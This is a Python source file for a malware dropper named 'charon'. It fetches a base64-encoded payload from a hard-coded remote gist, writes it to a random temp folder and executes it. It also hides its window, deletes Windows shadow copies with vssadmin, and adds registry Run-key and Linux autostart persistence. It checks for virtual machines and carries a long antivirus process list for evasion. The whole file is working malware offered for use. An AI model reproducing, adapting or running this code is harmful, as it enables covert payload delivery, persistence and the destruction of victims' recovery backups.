#!/usr/bin/env python3
# charon dropper
# author : 3v1l_un1c0rn

import base64
import datetime
import os
import platform
import random
import socket
import string
import subprocess
import sys
import tempfile
from urllib.request import urlopen

import requests

if platform.system().lower().startswith("win"):
    import winreg as _winreg

URL = "https://gist.githubusercontent.com/nico-duitsmann/991cfe27d2042a844ca3be7217dbb845/raw/7d9a509cd707589b16176d704d66a542f9422d09/putty"
VERSION = "cdrop1.0"
AVLIST = ['a2adguard.exe', 'a2adwizard.exe', 'a2antidialer.exe', 'a2cfg.exe', 'a2cmd.exe', 'a2free.exe', 'a2guard.exe', 'a2hijackfree.exe', 'a2scan.exe', 'a2service.exe', 'a2start.exe', 'a2sys.exe', 'a2upd.exe', 'aavgapi.exe', 'aawservice.exe', 'aawtray.exe', 'ad-aware.exe', 'ad-watch.exe', 'alescan.exe', 'anvir.exe', 'ashdisp.exe', 'ashmaisv.exe', 'ashserv.exe', 'ashwebsv.exe', 'aswupdsv.exe', 'atrack.exe', 'avgagent.exe', 'avgamsvr.exe', 'avgcc.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgtcpsv.exe', 'avguard.exe', 'avgupsvc.exe', 'avgw.exe', 'avkbar.exe', 'avk.exe', 'avkpop.exe', 'avkproxy.exe', 'avkservice.exe', 'avktray', 'avktray.exe', 'avkwctl', 'avkwctl.exe', 'avmailc.exe', 'avp.exe', 'avpm.exe', 'avpmwrap.exe', 'avsched32.exe', 'avwebgrd.exe', 'avwin.exe', 'avwupsrv.exe', 'avz.exe', 'bdagent.exe', 'bdmcon.exe', 'bdnagent.exe', 'bdss.exe', 'bdswitch.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'boc412.exe', 'boc425.exe', 'bocore.exe', 'bootwarn.exe', 'cavrid.exe', 'cavtray.exe', 'ccapp.exe', 'ccevtmgr.exe', 'ccimscan.exe', 'ccproxy.exe', 'ccpwdsvc.exe', 'ccpxysvc.exe', 'ccsetmgr.exe', 'cfgwiz.exe', 'cfp.exe', 'clamd.exe', 'clamservice.exe', 'clamtray.exe', 'cmdagent.exe', 'cpd.exe', 'cpf.exe', 'csinsmnt.exe', 'dcsuserprot.exe', 'defensewall.exe', 'defensewall_serv.exe', 'defwatch.exe', 'f-agnt95.exe', 'fpavupdm.exe', 'f-prot95.exe', 'f-prot.exe', 'fprot.exe', 'fsaua.exe', 'fsav32.exe', 'f-sched.exe', 'fsdfwd.exe', 'fsm32.exe', 'fsma32.exe', 'fssm32.exe', 'f-stopw.exe', 'f-stopw.exe', 'fwservice.exe', 'fwsrv.exe', 'iamstats.exe', 'iao.exe', 'icload95.exe', 'icmon.exe', 'idsinst.exe', 'idslu.exe', 'inetupd.exe', 'irsetup.exe', 'isafe.exe', 'isignup.exe', 'issvc.exe', 'kav.exe', 'kavss.exe', 'kavsvc.exe', 'klswd.exe', 'kpf4gui.exe', 'kpf4ss.exe', 'livesrv.exe', 'lpfw.exe', 'mcagent.exe', 'mcdetect.exe', 'mcmnhdlr.exe', 'mcrdsvc.exe', 'mcshield.exe', 'mctskshd.exe', 'mcvsshld.exe', 'mghtml.exe', 'mpftray.exe', 'msascui.exe', 'mscifapp.exe', 'msfwsvc.exe', 'msgsys.exe', 'msssrv.exe', 'navapsvc.exe', 'navapw32.exe', 'navlogon.dll', 'navstub.exe', 'navw32.exe', 'nisemsvr.exe', 'nisum.exe', 'nmain.exe', 'noads.exe', 'nod32krn.exe', 'nod32kui.exe', 'nod32ra.exe', 'npfmntor.exe', 'nprotect.exe', 'nsmdtr.exe', 'oasclnt.exe', 'ofcdog.exe', 'opscan.exe', 'ossec-agent.exe', 'outpost.exe', 'paamsrv.exe', 'pavfnsvr.exe', 'pcclient.exe', 'pccpfw.exe', 'pccwin98.exe', 'persfw.exe', 'protector.exe', 'qconsole.exe', 'qdcsfs.exe', 'rtvscan.exe', 'sadblock.exe', 'safe.exe', 'sandboxieserver.exe', 'savscan.exe', 'sbiectrl.exe', 'sbiesvc.exe', 'sbserv.exe', 'scfservice.exe', 'sched.exe', 'schedm.exe', 'schedulerdaemon.exe', 'sdhelp.exe', 'serv95.exe', 'sgbhp.exe', 'sgmain.exe', 'slee503.exe', 'smartfix.exe', 'smc.exe', 'snoopfreesvc.exe', 'snoopfreeui.exe', 'spbbcsvc.exe', 'sp_rsser.exe', 'spyblocker.exe', 'spybotsd.exe', 'spysweeper.exe', 'spysweeperui.exe', 'spywareguard.dll', 'spywareterminatorshield.exe', 'ssu.exe', 'steganos5.exe', 'stinger.exe', 'swdoctor.exe', 'swupdate.exe', 'symlcsvc.exe', 'symundo.exe', 'symwsc.exe', 'symwscno.exe', 'tcguard.exe', 'tds2-98.exe', 'tds-3.exe', 'teatimer.exe', 'tgbbob.exe', 'tgbstarter.exe', 'tsatudt.exe', 'umxagent.exe', 'umxcfg.exe', 'umxfwhlp.exe', 'umxlu.exe', 'umxpol.exe', 'umxtray.exe', 'usrprmpt.exe', 'vetmsg9x.exe', 'vetmsg.exe', 'vptray.exe', 'vsaccess.exe', 'vsserv.exe', 'wcantispy.exe', 'win-bugsfix.exe', 'winpatrol.exe', 'winpa""rolex.exe', 'wrsssdk.exe', 'xcommsvr.exe', 'xfr.exe', 'xp-antispy.exe', 'zegarynka.exe', 'zlclient.exe']


def hide_window():
    import ctypes
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    SW_HIDE = 0
    hWnd = kernel32.GetConsoleWindow()
    user32.ShowWindow(hWnd, SW_HIDE)

def gen_random(size: int = 16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=size))

def setup_dropdir():
    dropdir = tempfile.gettempdir() + os.sep + gen_random()
    if not os.path.exists(dropdir):
        os.makedirs(dropdir)
    return dropdir


class AutostartManager:
    class Windows:
        @staticmethod
        def get_runonce() -> str:
            _registry = _winreg.ConnectRegistry(None, _winreg.HKEY_CURRENT_USER)
            return _winreg.OpenKey(_registry,
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
            _winreg.KEY_ALL_ACCESS)

        @staticmethod
        def add(name: str, application: str):
            key = AutostartManager.Windows.get_runonce()
            _winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, application)
            _winreg.CloseKey(key)

        @staticmethod
        def exists(name: str) -> bool:
            key = AutostartManager.Windows.get_runonce()
            exists = True
            try:
                _winreg.QueryValueEx(key, name)
            except WindowsError:
                exists = False
            _winreg.CloseKey(key)
            return exists

        @staticmethod
        def remove(name: str):
            key = AutostartManager.Windows.get_runonce()
            _winreg.DeleteValue(key, name)
            _winreg.CloseKey(key)

    class Linux:
        @staticmethod
        def getfilename(name: str) -> str:
            _xdg_config_home = os.environ.get("XDG_CONFIG_HOME", "~/.config")
            _xdg_user_autostart = os.path.join(os.path.expanduser(_xdg_config_home),
                                               "autostart")
            return os.path.join(_xdg_user_autostart, name + ".desktop")

        @staticmethod
        def add(name: str, application: str):
            desktop_entry = "[Desktop Entry]\n"\
                "Name=%s\n"\
                "Exec=%s\n"\
                "Type=Application\n"\
                "Terminal=false\n" % (name, application)
            with open(AutostartManager.Linux.getfilename(name), "w") as f:
                f.write(desktop_entry)

        @staticmethod
        def exists(name: str) -> bool:
            return os.path.exists(AutostartManager.Linux.getfilename(name))

        @staticmethod
        def remove(name: str):
            os.unlink(AutostartManager.Linux.getfilename(name))


class CDropException(Exception):
    pass


class Dropkit:
    @staticmethod
    def check_cmd(cmd: str) -> str:
        out = subprocess.check_output(cmd, shell=True,
                                      stderr=subprocess.DEVNULL)
        out = out.decode().lower()
        return out

    @staticmethod
    def exec_cmd(cmd: str) -> bool:
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out  = proc.stdout.read() + proc.stderr.read()
        if out:
            return True
        else:
            return False

    @staticmethod
    def get_os() -> str:
        return platform.system().lower()

    @DeprecationWarning
    @staticmethod
    def get_avs() -> list:
        avs = list()
        for pname in AVLIST:
            if Dropkit.is_av_installed(pname):
                avs.append(pname)
        return avs

    @staticmethod
    def is_admin() -> bool:
        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin

    @staticmethod
    def is_vm() -> bool:
        if Dropkit.get_os().startswith("win"):
            cmd = "Systeminfo | findstr /i model"
            out = Dropkit.check_cmd(cmd)
            idf = ["virt", "vm", "oracle", "parallel"]

            for id in idf:
                if id in out:
                    return True
        elif Dropkit.get_os().startswith("linux"):
            cmd = "dmesg | grep -i hypervisor"
            out = Dropkit.check_cmd(cmd)

            if "detected" in out:
                return True
        elif Dropkit.get_os() == "darwin":
            cmd = "ioreg -l | grep -e Manufacturer -e '{}'"
            idf = ["virt", "vm", "oracle", "parallel"]

            for id in idf:
                cmd.format(id)
                if Dropkit.exec_cmd(cmd):
                    return True
        else:
            return False

    @staticmethod
    def is_process_running(pname: str) -> bool:
        cmd = "tasklist /v /fo csv | findstr /i {}"
        cmd = cmd.format(pname)
        if Dropkit.exec_cmd(cmd):
            return True
        else:
            return False

    @staticmethod
    def is_port_open(port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((socket.gethostname(), port))

            if result == 0:
                return True
            sock.close()
        except socket.error:
            return False

    @staticmethod
    def has_connection(host: str = "http://216.58.192.142") -> bool:
        try:
            urlopen(host, timeout=1)
            return True
        except:
            return False

    @staticmethod
    def check_ports() -> list:
        req_ports = [21, 22, 443]

        for port in req_ports:
            if Dropkit.is_port_open(port):
                req_ports.append(port)
        return req_ports


    @staticmethod
    def disable_shadow_copies() -> int:
        Dropkit.exec_cmd("vssadmin.exe delete shadows /all /quiet")



class Dropper(object):
    def __init__(self, dropdir: str, crypter_url: str,
                 autoclean: bool = False, mode: str = None):
        self._dropdir = dropdir
        self._crypter_url = crypter_url
        self._autoclean = autoclean
        self._mode = mode
        self._installed_f = tempfile.gettempdir() + os.sep + "charon"

        self._final_dest = None
        self._modes = {
            "install" : self.install,
            "install_offline" : self.install_offline,
            "reinstall" : self.reinstall,
            "uninstall" : self.uninstall,
            "cleanup" : self.cleanup,
            "run" : self.run
        }

        if self._mode is not None and self._mode in tuple(self._modes):
            self._modes[self._mode]()

    def installed(self) -> bool:
        return os.path.isfile(self._installed_f)

    def install(self) -> bool:
        req = requests.get(self._crypter_url)
        raw = base64.b64decode(req.text)

        if Dropkit.get_os().startswith("win"):
            dest = self._dropdir + os.sep + gen_random() + ".exe"
        else:
            dest = self._dropdir + os.sep + gen_random()

        with open(dest, "wb") as crypter:
            crypter.write(raw)

        self._final_dest = dest
        with open(self._installed_f, "w") as f:
            f.write(VERSION + "\n")
            f.write(datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S") + "\n")
            f.write("?" + self._final_dest)

        Dropkit.exec_cmd(dest)

    @staticmethod
    def install_offline() -> bool:
        pass # TODO: unpack base64 encoded crypter

    def reinstall(self) -> bool:
        self.cleanup()
        self.install()

    def uninstall(self) -> bool:
        self.cleanup()

    def cleanup(self) -> bool:
        if not os.path.exists(self._installed_f):
            return False

        final_dest = open(self._installed_f, "r").read().split("?")[1]

        try:
            os.remove(self._installed_f)
            os.remove(final_dest)
        except OSError:
            pass
        if Dropkit.get_os().startswith("win"):
            Dropkit.disable_shadow_copies()

    def run(self):
        if Dropkit.get_os().startswith("win"):
            hide_window()
            Dropkit.disable_shadow_copies()
            critical_processes = \
                ["taskmgr.exe", "procexp.exe", "regedit.exe", "msconfig.exe", "cmd.exe"]
            for cp in critical_processes:
                if Dropkit.is_process_running(cp):
                    AutostartManager.Windows.add(gen_random(), os.path.abspath(sys.argv[0]))
                    sys.exit(0)

        while Dropkit.has_connection():
            if not self.installed():
                try:
                    self.install()
                except CDropException:
                    pass
            break
        if self._autoclean:
            self.uninstall()


def cdrop_main():
    if len(sys.argv) > 1:
        mode = sys.argv[1]
        try:
            url = sys.argv[2]
        except IndexError:
            url = URL
    else:
        mode = "run"
        url = URL

    dropdir = setup_dropdir()
    Dropper(dropdir, url, mode=mode)


if __name__ == "__main__":
    try:
        cdrop_main()
    except CDropException:
        Dropper.install_offline()
